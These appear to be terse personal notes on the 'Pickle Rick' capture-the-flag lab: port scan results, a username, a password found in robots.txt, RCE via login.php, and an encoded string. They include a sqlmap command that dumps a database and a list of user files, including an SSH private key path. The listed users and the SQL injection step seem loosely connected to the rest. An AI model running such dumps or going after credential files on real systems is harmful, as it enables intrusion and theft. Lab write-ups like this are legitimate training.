# Pickle Rick

---

## Reconnaissance

### Nmap Scan

open port are : 80 and 22

### Enumerating the web app

found username : R1ckRul3s
look at /robots.txt and found a passwd
login.php and we got a RCE

encode
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==

```shell
sqlmap -r form.req --dbms=mySQL  -p 'username' -risk=3 --level=3 --dump
```

/home/papa/.bash_history
/home/papa/.bash_logout
/home/papa/.profile
/home/papa/.bashrc
/home/papa/.sudo_as_admin_successful
/home/papa/.pwntools-cache-2.7/update
/home/pingu/.gdbinit
/home/pingu/.cache/motd.legal-displayed
/home/pingu/.ssh/id_rsa
/home/pingu/.ssh/id_rsa.pub
/home/pingu/.gdb_history
/home/pingu/.pwntools-cache-2.7/update
/home/pingu/.pwntools-cache-2.7/update
